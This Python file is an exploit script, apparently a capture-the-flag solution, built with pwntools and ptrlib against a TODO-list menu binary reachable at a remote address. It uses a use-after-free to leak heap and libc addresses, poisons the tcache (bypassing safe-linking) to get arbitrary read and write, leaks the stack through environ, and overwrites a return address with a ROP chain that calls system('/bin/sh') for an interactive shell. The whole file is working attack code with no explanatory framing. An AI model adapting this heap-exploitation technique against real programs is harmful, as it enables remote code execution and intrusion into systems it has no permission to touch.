#!/usr/bin/env python
import sys
import ptrlib as ptr
import pwn
import time

exe = ptr.ELF("./todo_patched")
pwn.context.binary = pwn.ELF(exe.filepath)
libc = ptr.ELF("./libc.so.6")

remote = len(sys.argv) > 1 and sys.argv[1] == "remote"


def connect():
    if remote:
        return pwn.remote("34.170.146.252", 35658)
        # return pwn.remote("localhost", 5000)
    else:
        return pwn.process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("Failed to unwrap")
        exit(1)
    else:
        return x


def main():
    io = connect()

    def add(data: bytes):
        io.sendlineafter(b"> ", b"1")
        io.sendlineafter(b"TODO: ", data)
        return

    def show(index: int):
        io.sendlineafter(b"> ", b"2")
        io.sendlineafter(b"Index: ", str(index).encode())
        io.recvuntil(b"TODO: ")
        return

    def edit(index: int, data: bytes):
        io.sendlineafter(b"> ", b"3")
        io.sendlineafter(b"Index: ", str(index).encode())
        io.sendlineafter(b"TODO: ", data)
        return

    def delete(index: int):
        io.sendlineafter(b"> ", b"4")
        io.sendlineafter(b"Index: ", str(index).encode())
        return

    for _ in range(3):
        add(b"A" * 0x20)
    add(b"A" * 0x500)
    add(b"A" * 0x20)

    delete(4)
    show(4)
    heap_base = (ptr.u64(io.recv(8)) << 12) - 0x14000
    if remote:
        heap_base -= 0x1000
    ptr.logger.info(f"heap_base: {hex(heap_base)}")

    delete(3)
    show(3)
    libc.base = ptr.u64(io.recv(8)) - unwrap(libc.symbol("main_arena")) - 96

    add(b"B" * 0x20)
    add(b"A" * 0x20)

    delete(3)
    delete(4)
    chunk_addr = heap_base + 0x14370
    dest_addr = heap_base + 0x14880
    if remote:
        chunk_addr = heap_base + 0x14F70
        dest_addr = heap_base + 0x15480
    link = (chunk_addr >> 12) ^ dest_addr
    edit(3, ptr.p64(link))

    add(b"B" * 0x20)
    environ = unwrap(libc.symbol("environ"))
    ptr.logger.info(f"environ: {hex(environ)}")
    payload = b""
    payload += ptr.p64(environ)
    payload += ptr.p64(0x20)
    payload += ptr.p64(0x20)
    payload += ptr.p64(0)
    add(payload)

    show(0)
    ret_addr = ptr.u64(io.recv(8)) - 0x1C0
    ptr.logger.info(f"ret_addr: {hex(ret_addr)}")

    edit(4, ptr.p64(ret_addr))

    payload = b""
    payload += ptr.p64(next(libc.gadget("ret;")))
    payload += ptr.p64(next(libc.gadget("pop rdi; ret;")))
    payload += ptr.p64(next(libc.find("/bin/sh\0")))
    payload += ptr.p64(unwrap(libc.symbol("system")))

    edit(0, payload)

    io.interactive()
    return


if __name__ == "__main__":
    main()
